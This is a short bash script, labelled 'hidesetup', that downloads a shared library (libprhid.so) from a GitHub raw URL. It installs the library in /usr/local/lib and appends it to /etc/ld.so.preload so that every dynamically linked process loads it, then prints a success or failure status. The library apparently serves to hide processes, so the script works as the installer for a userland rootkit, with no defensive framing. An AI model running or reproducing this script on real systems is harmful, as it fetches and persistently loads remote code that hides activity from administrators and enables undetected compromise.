wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/libprhid.so ;
mv libprhid.so /usr/local/lib/;
echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
if [[ -f /usr/local/lib/libprhid.so && -f /etc/ld.so.preload ]] ;
  then printf "%-20s %20s\n" " hidesetup" "[  DONE  ]" ;
else printf "%-20s %20s\n" " hidesetup" "[  FAILED  ]" ;
fi
